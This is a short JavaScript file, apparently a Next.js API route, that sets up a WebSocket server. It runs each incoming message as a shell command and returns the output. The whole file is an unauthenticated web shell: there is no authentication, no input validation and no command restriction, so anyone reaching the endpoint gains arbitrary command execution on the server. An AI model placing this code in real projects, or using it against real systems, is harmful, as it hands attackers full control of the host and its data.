import { spawn } from 'child_process';
import WebSocket from 'ws';

export default function handler(req, res) {
  if (req.method === 'GET') {
    if (!res.socket.server.wss) {
      const wss = new WebSocket.Server({ noServer: true });
      res.socket.server.wss = wss;
      res.socket.server.on('upgrade', (request, socket, head) => {
        wss.handleUpgrade(request, socket, head, ws => {
          wss.emit('connection', ws, request);
        });
      });

      wss.on('connection', ws => {
        ws.on('message', message => {
          const cmd = message.toString();
          const proc = spawn(cmd, { shell: true });
          let output = '';
          proc.stdout.on('data', data => {
            output += data.toString();
          });
          proc.stderr.on('data', data => {
            output += data.toString();
          });
          proc.on('close', () => {
            ws.send(output);
          });
        });
      });
    }
    res.status(200).end();
  } else {
    res.status(405).end();
  }
}
